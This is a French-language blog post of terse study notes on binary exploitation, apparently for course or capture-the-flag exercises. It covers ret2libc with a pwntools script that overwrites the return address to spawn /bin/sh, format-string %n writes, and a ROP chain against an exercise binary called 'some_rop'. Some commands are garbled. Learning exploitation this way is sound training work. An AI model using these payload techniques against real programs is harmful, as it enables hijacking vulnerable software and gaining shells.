---
layout: post
title: Ret2lib_C
---


/usr/share/metasploit/tools/exploit/pattern_create -l 150
/usr/share/metasploit/tools/exploit/pattern_offset -q 0x<adresse de SIGCEV>

Faire crash le programme via le input

Ou via gdb : 
gdb programme
r <<< $(python2 -c 'print """)

coredumpctl list
coredumpctl gdb <PID>

gdb ./monreverse
start
print &system
print &exit
search --string /bin/sh



script du payload : 


from pwn import *

padding = "\x90" * 112
eip = p32(0xf7de76e0)
exit = p32(0xf7dd9e50)
binsh = p32(0xf7f37108)

payload = padding + eip + exit + binsh

with open("payload.bin", "wb") as f:
    f.write(payload)






Execute la stack 
(cat payload.bin;cat)|./<programme>


FFormat String : 

Dans le style de l’exo de format_example :

afficher un endroit dans la mémoire : 

%”numéro”$x  → afficher la valeur
%”numéro”$n → écris une valeur Exemple: %.65536d%23$n
Pour afficher une valeur en Hexa : 
python 
0x10000


ROP 64/32 bits : 
Ouvrir dans ghidra et gdb (installer gef)
difference entre 64 et 32 quand on appelle la fonction les arguments sont avant en 64 et après en 32

Trouver la rop :
tenter une chaine de caractère et surveiller rsi et rbp

ERREUR
Segmentation fault : problème 
bus error : OK 

se rendre sur ghidra trouver les fonctions et leurs arguments : exemple exo some_rop

win1 = 0x00400657
win2 = 0x00400697
flag = 0x004006e3

p64(win1) + p64(POP_RDI) + p64(0xabcdef11)

Pour trouver les POP il faut l’outil ROPgadget : https://github.com/JonathanSalwan/ROPgadget

ROPgadget --binary some_rop | grep pop


Et pour exécuter et pas se prendre la tête avec le 32 et 64 bits il faut installer la lib pwn sur python : 

http://docs.pwntools.com/en/stable/install.html

Vérifier que le programme suivant fonctionne (il doit vous créer un fichier input et reste plus à le lancer avec notre executable: 

---------------------------------------------------------------------------------------------------------------
import subprocess
import os
import sys
from pwn import *


# input correction
elf = ELF("some_rop")
rop = ROP(elf)
win1 = 0x00400657
win2 = 0x00400697
flag = 0x004006e3
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

padding = b'A' * 24

exploit = padding + p64(win1) + p64(POP_RDI) + p64(0xabcdef11)
exploit += p64(win2) + p64(POP_RDI) + p64(0xcafeefca) 
exploit += p64(POP_RSI) + p64(0xdeadbabe) +p64(0) + p64(flag)
# rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()
-----------------------------------------------------------------------------------------------------------------
